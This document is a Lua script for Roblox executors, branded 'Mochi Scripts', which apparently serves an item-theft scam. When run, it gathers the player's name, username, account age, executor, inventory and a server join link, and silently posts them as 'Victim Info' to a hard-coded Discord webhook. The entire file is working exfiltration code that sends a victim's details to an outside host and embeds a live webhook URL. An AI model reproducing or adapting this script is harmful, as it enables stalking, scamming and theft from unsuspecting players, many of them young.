-- Mochi Scripts 🤓 | FINAL - ONE EXECUTE ONLY + CUSTOM RECEIVER TEXT (no extra timestamp in footer)

--------------------------------------------------
-- WAIT FOR GAME TO LOAD
--------------------------------------------------
repeat task.wait() until game:IsLoaded()

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
repeat task.wait() until player
repeat task.wait() until player.Character

--------------------------------------------------
-- CHECK IF ALREADY EXECUTED IN THIS SESSION
--------------------------------------------------
local FLAG_NAME = "MochiSent_" .. game.PlaceId

local alreadySent = false

-- Check in PlayerGui
if player:FindFirstChild("PlayerGui") then
    if player.PlayerGui:FindFirstChild(FLAG_NAME) then
        alreadySent = true
    end
end

-- Extra check in CoreGui (if executor allows)
if not alreadySent then
    pcall(function()
        if game:GetService("CoreGui"):FindFirstChild(FLAG_NAME) then
            alreadySent = true
        end
    end)
end

if alreadySent then
    print("→ Already sent webhook in this session. Skipping execution.")
    return
end

--------------------------------------------------
-- MARK AS SENT (create flag)
--------------------------------------------------
local function markAsSent()
    -- PlayerGui flag
    local pgui = player:WaitForChild("PlayerGui", 5)
    if pgui then
        local flag = Instance.new("BoolValue")
        flag.Name = FLAG_NAME
        flag.Value = true
        flag.Archivable = false
        flag.Parent = pgui
    end
    
    -- CoreGui backup (if possible)
    pcall(function()
        local core = game:GetService("CoreGui")
        local flag2 = Instance.new("BoolValue")
        flag2.Name = FLAG_NAME
        flag2.Value = true
        flag2.Archivable = false
        flag2.Parent = core
    end)
end

--------------------------------------------------
-- WEBHOOK URL (CHANGE THIS)
--------------------------------------------------
local WEBHOOK_URL = "https://discord.com/api/webhooks/1452520279447306410/mXVDUBBGbQnOSobmKGBszQT5h0UpJV8MphP6d7j3dP0ydAqaUJHlPIY0hgOYmYPiIFXi"

--------------------------------------------------
-- HTTP REQUEST FUNCTION
--------------------------------------------------
local httpRequest = 
    (syn and syn.request) or 
    (http and http.request) or 
    http_request or 
    request

if not httpRequest then
    warn("❌ No HTTP request function available in this executor")
    return
end

--------------------------------------------------
-- GET EXECUTOR NAME
--------------------------------------------------
local function getExecutor()
    if identifyexecutor then return identifyexecutor() end
    if syn     then return "Synapse X" end
    if fluxus  then return "Fluxus"    end
    if KRNL_LOADED then return "KRNL" end
    return "Unknown Executor"
end

--------------------------------------------------
-- GET GAME NAME
--------------------------------------------------
local function getGameName()
    local success, result = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId).Name
    end)
    return success and result or "Unknown Game"
end

--------------------------------------------------
-- PLAYER THUMBNAIL
--------------------------------------------------
local function getThumbnail(userId)
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
end

--------------------------------------------------
-- CLEAN ITEM NAME
--------------------------------------------------
local function getRealItemName(tool)
    if tool:GetAttribute("DisplayName") then
        return tostring(tool:GetAttribute("DisplayName"))
    end
    
    local itemNameObj = tool:FindFirstChild("ItemName")
    if itemNameObj and itemNameObj:IsA("StringValue") then
        return itemNameObj.Value
    end
    
    return tool.Name
end

--------------------------------------------------
-- GET INVENTORY (no (Equipped) tag)
--------------------------------------------------
local function getInventory()
    local items = {}
    
    -- Backpack
    local backpack = player:FindFirstChild("Backpack")
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, "• " .. getRealItemName(item))
            end
        end
    end
    
    -- Character (equipped)
    if player.Character then
        for _, item in ipairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, "• " .. getRealItemName(item))
            end
        end
    end
    
    if #items == 0 then
        return "None"
    end
    
    return table.concat(items, "\n")
end

--------------------------------------------------
-- SEND TO DISCORD WEBHOOK
--------------------------------------------------
local function sendWebhook()
    local payload = {
        embeds = {{
            title = "Mochi Scripts 🤓",
            description = "**" .. getGameName() .. "**",
            color = 5793266,
            thumbnail = {
                url = getThumbnail(player.UserId)
            },
            fields = {
                {
                    name = "📄 Victim Info",
                    value = string.format(
                        "```👤 Display Name : %s\n🆔 Username     : %s\n📅 Account Age  : %d days\n🖥 Executor     : %s\n👥 Players      : %d/%d\n😎 Receiver     : Username```",
                        player.DisplayName,
                        player.Name,
                        player.AccountAge,
                        getExecutor(),
                        #Players:GetPlayers(),
                        Players.MaxPlayers
                    ),
                    inline = false
                },
                {
                    name = "👜 Inventory",
                    value = "```" .. getInventory() .. "```",
                    inline = false
                },
                {
                    name = "👥 Join Player",
                    value = "[**Join Server**](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId .. ")",
                    inline = false
                }
            },
            footer = {
                text = "Mochi Scripts 🤓"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")  -- Discord auto-format timestamp (optional, pero useful pa rin)
        }}
    }

    print("📡 Sending data to webhook...")

    local success, response = pcall(function()
        return httpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("✅ Webhook sent successfully")
        markAsSent()   -- only mark if successful
    else
        warn("❌ Failed to send webhook: " .. tostring(response))
    end
end

--------------------------------------------------
-- EXECUTE
--------------------------------------------------
task.wait(1.5)
sendWebhook()
